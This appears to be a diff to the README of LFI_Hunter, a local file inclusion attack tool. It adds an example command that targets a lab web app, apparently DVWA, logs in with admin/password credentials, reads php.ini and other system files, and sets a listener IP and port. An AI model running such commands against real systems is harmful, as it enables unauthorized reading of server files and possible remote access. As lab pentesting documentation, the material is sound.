@@ -147,8 +147,13 @@ In this command:
    ```bash
    LFI_Hunter -UV http://example.com/vulnerable_path?file= -C session_cookie.txt -R /var/log/auth.log -S 192.168.0.10 --port 5555
    ```
+   ```   
+    lfi_hunter -UV http://172.17.0.2/vulnerabilities/fi/?page= -C /home/jacstory/.MYTOOLS/LFI_Hunter/cook -R /etc/php/7.0/apache2/php.ini -B --auth -LU http://172.17.0.2/login.php -U admin -P password -PF password -UF username -S 172.17.0.1 --port 5555
+   ```
+Explanation
 
-
+* This command runs lfi_hunter against a vulnerable URL (-UV) for Local File Inclusion (LFI) testing, using cookies from a specified path (-C), trying to read php.ini (-R), with PHP base64 encoding (-B). It authenticates using credentials at a login URL (--auth, -LU, -U, -P), specifying HTML form field names for the username and password (-UF, -PF). It sets the local IP (-S) and listener port (--port).
+* 
 ## Files
 
 - **config.txt**: Configuration file storing default options, useful for automation.
